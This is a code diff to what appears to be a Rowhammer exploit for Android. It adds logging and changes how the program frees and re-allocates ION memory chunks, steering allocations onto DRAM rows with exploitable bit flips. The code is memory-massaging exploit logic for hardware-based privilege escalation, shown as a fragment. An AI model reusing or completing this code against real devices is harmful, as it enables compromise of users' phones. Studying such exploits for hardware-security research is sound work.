@@ -36,6 +36,7 @@
 #include "massage.h"
 #include "rowsize.h"
 #include "templating.h"
+#include "log/src/log.h"
 
 #define HAMMER_READCOUNT 1000000
 
@@ -313,6 +314,7 @@ int main(int argc, char *argv[]) {
                 templates.clear();
             }
             run_cnt++;
+            log_info("Run %u", run_cnt);
             get_buddy_info();
 
             // Exhaust L
@@ -338,6 +340,7 @@ int main(int argc, char *argv[]) {
             get_buddy_info();
 
             // Free L* with particular exploitable bit
+            auto l_star_va = (uintptr_t) first_expl->ion_chunk->mapping;
             print("[FREE L] Free L* at va %p\n", first_expl->ion_chunk->mapping);
             print("[FREE L] Exploitable bit at va %p\n", first_expl->virt_addr);
             if (first_expl->virt_row == (uintptr_t)first_expl->ion_chunk->mapping) {
@@ -349,38 +352,35 @@ int main(int argc, char *argv[]) {
 
             // Immediately exhaust M again
             printf("[EXHAUST M] Exhaust M (64KB) ION chunks again\n");
-            count = ION_bulk(K(64), ion_chunks, 0);
+            count = ION_bulk(K(64), ion_chunks, 0, false);
             print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
             if (count != 64) {
                 // M doesn't use free space of L*
-                printf("[EXHAUST M] - size mismatch\n");
+                log_warn("[EXHAUST M] - size mismatch");
                 continue;
             }
             get_buddy_info();
 
-            count = 0;
-            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
-                print("[MAIN] New M at va %p\n", (*it)->mapping);
-                count++;
-                if (count == 64) break;
-            }
+//            // Prints 0xb690... to 0xb6cf (means that addresses in the vector is in reversed order
+//            count = 0;
+//            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
+//                print("[MAIN] New M at va %p\n", (*it)->mapping);
+//                count++;
+//                if (count == 64) break;
+//            }
 
             // Free M* and all L
-            bool addr_correct = false;
+            uint32_t m_star_idx = (first_expl->virt_row >> 16) - (l_star_va >> 16);
+            log_debug("m_star_idx = %u", m_star_idx);
+            ION_clean(ion_chunks.at(ion_chunks.size() - 1 - m_star_idx));
+
             for (auto chunk : ion_chunks) {
                 if (chunk->len == M(4)) {
 //                    print("[FREE L] Free %p, len %d\n", chunk->mapping, chunk->len);
                     ION_clean(chunk);
-                } else if ((uintptr_t)chunk->mapping == first_expl->virt_row) {
-                    addr_correct = true;
-                    print("[FREE M] Free %p, len %d\n", chunk->mapping, chunk->len);
-                    ION_clean(chunk);
                 }
             }
-            if (!addr_correct) {
-                printf("[FREE M] - M* address is not correct\n");
-                continue;
-            }
+            get_buddy_info();
 
             // Allocate S until S start to land in M*
             // 0  1  2   3   4   5    6    7    8  9  10
@@ -388,7 +388,7 @@ int main(int argc, char *argv[]) {
             uint32_t free[11];
             get_buddy_info("Normal", free);
             if (free[4] != 1) {
-                printf("[EXHAUST S] More than one 64K holes\n");
+                log_warn("[EXHAUST S] More than one 64K holes");
                 continue;
             }
             while (true) {
@@ -419,7 +419,7 @@ int main(int argc, char *argv[]) {
 
             break;
         } while(true);
-        printf("[END] Run %u time(s)\n", run_cnt);
+        log_info("[MAIN] Run %u time(s)", run_cnt);
     }
 
     /*** CLEAN UP */
